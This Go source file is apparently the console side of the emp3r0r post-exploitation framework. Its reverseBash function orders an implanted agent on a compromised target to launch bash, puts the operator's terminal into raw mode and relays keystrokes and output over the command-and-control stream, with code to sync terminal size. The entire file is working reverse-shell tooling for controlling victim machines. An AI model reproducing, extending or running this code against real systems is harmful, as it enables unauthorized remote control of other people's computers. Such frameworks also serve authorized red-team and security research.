package cc

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/creack/pty"
	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
)

func reverseBash() {
	// check if stty is installed
	if !IsCommandExist("stty") {
		CliPrintError("stty is not found, wtf?")
		return
	}

	// activate reverse shell in agent
	err := SendCmd("bash", CurrentTarget)
	if err != nil {
		CliPrintError("Cannot activate reverse shell on remote target: ", err)
		return
	}

	// use /dev/tty for our console
	ttyf, err := os.Open("/dev/tty")
	if err != nil {
		CliPrintError("Cannot open /dev/tty: %v", err)
	}

	cleanup := func() {
		out, err := exec.Command("stty", "-F", "/dev/tty", "sane").CombinedOutput()
		if err != nil {
			CliPrintError("failed to restore terminal: %v\n%s", err, out)
		}

		err = agent.CCStream.Close()
		if err != nil {
			CliPrintWarning("Closing reverse shell connection: ", err)
		}
	}
	defer cleanup()

	// receive and display bash's output
	go func() {
		for incoming := range RecvAgentBuf {
			os.Stdout.Write(incoming)
		}
	}()

	// send whatever input to target's bash
	go func() {
		for outgoing := range SendAgentBuf {
			if agent.CCStream == nil {
				continue
			}
			_, err = agent.CCStream.Write(outgoing)
			if err != nil {
				log.Print("Send to remote: ", err)
			}
		}
	}()

	/*
		set up terminal
	*/
	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ttyf); err != nil {
				log.Printf("error resizing pty: %s", err)
			}

			// set remote stty
			winSize, err := pty.GetsizeFull(os.Stdin)
			if err != nil {
				CliPrintWarning("Cannot get terminal size: %v", err)
			}
			setupTermCmd := fmt.Sprintf("stty rows %d columns %d\n",
				winSize.Rows, winSize.Cols)
			SendAgentBuf <- []byte(setupTermCmd)
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	currentWinSize, err := pty.GetsizeFull(os.Stdin)
	if err != nil {
		CliPrintWarning("Cannot get terminal size: %v", err)
	}

	// switch to raw mode
	out, err := exec.Command("stty", "-F", "/dev/tty", "raw", "-echo").CombinedOutput()
	if err != nil {
		CliPrintError("stty raw mode failed: %v\n%s", err, out)
		return
	}

	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;reset\n",
		currentWinSize.Rows, currentWinSize.Cols)
	SendAgentBuf <- []byte(setupTermCmd)

	for {
		// read stdin
		buf := make([]byte, agent.BufSize)
		consoleReader := bufio.NewReader(ttyf)
		_, err := consoleReader.Read(buf)
		if err != nil {
			CliPrintWarning("Bash read input: %v", err)
		}
		if buf[0] == 4 { // Ctrl-D is 4
			color.Red("EOF")
			break
		}

		// send our byte
		SendAgentBuf <- buf
	}
}
